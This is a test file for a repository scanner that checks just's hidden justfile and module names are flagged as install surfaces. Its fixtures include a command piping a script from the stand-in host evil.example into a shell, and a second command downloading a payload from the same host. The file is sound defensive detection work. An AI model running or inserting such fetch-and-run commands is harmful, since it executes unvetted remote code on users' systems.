import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/**
 * One unambiguous unsafe-execution payload, independent of the file name.
 * just runs the recipe body as a shell command.
 */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function findingLabels(path: string, text: string) {
  return inspected(path, text).findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

/**
 * just's search list is `justfile` and `.justfile`, compared without regard
 * to case (casey/just `JUSTFILE_NAMES`). `mod name` then loads `name.just`
 * or `name/mod.just`: the stem keeps the module's case and the extension is
 * the lowercase spelling `.just`. A plain `justfile` is already an install
 * surface; these siblings are the same recipes under the names the scanner
 * does not read.
 */
const HIDDEN_JUSTFILES = [
  ".justfile",
  ".Justfile",
  "tools/.JUSTFILE",
  "bar.just",
  // `mod FOO` loads `FOO.just`; the extension itself stays lowercase.
  "FOO.just",
  "foo/mod.just",
];

test("just's hidden justfile and module files are install surfaces", () => {
  const recipe = `install:\n  ${PAYLOAD}\n`;
  // The visible name is the control: the same recipe is already reviewed.
  expect(surfacesOf("justfile")).toEqual(["installScripts", "source"]);
  expect(findingLabels("justfile", recipe)).toEqual([
    "justfile:unsafe-execution:high",
  ]);

  for (const path of HIDDEN_JUSTFILES) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    const inspection = inspected(path, recipe);
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({ path, findings: findingLabels(path, recipe) }).toEqual({
      path,
      findings: [`${path}:unsafe-execution:high`],
    });
    expect({ path, downloads: inspection.downloads }).toEqual({
      path,
      downloads: ["https://evil.example/install.sh"],
    });
    expect({ path, visibilityGaps: inspection.visibilityGaps }).toEqual({
      path,
      visibilityGaps: [
        "Install-time download not retrieved: https://evil.example/install.sh",
      ],
    });
  }
});

test("a download in a just module is collected when it is not piped into a shell", () => {
  // Download collection runs on install surfaces only. Saving the body is
  // not itself execution, so there is no unsafe-execution finding, but the
  // URL just would fetch stays a visibility gap.
  const inspection = inspected(
    "bar.just",
    "fetch:\n  curl -fsSL https://evil.example/payload -o /tmp/payload\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary hidden justfile keeps no finding", () => {
  const inspection = inspected(".justfile", "test:\n  cargo test\n");
  expect(surfacesOf(".justfile")).toEqual(["installScripts", "source"]);
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
  expect(inspection.visibilityGaps).toEqual([]);
});

test("names just does not load keep their surfaces", () => {
  // `justfile.md` is not a search name. just tangles Markdown only after a
  // file was already selected, and the default names have no extension.
  expect(surfacesOf("justfile.md")).toEqual([]);
  expect(surfacesOf("docs/not.justfile")).toEqual([]);
  expect(surfacesOf(".justfile.bak")).toEqual([]);
  expect(surfacesOf("notes.just.txt")).toEqual([]);
  // just looks for the lowercase extension only, so these are not modules.
  expect(surfacesOf("foo.JUST")).toEqual([]);
  expect(surfacesOf("foo.Just")).toEqual([]);
  expect(surfacesOf("foo/mod.JUST")).toEqual([]);
  expect(inspected("NOTICE", `install:\n  ${PAYLOAD}\n`).findings).toEqual([]);
});

test("changing a hidden justfile changes the reviewed inventory", () => {
  const before = inspected(".justfile", "test:\n  cargo test\n");
  const after = inspected(".justfile", "test:\n  cargo test --all\n");
  expect(before.inventorySha256).not.toBe(after.inventorySha256);
});
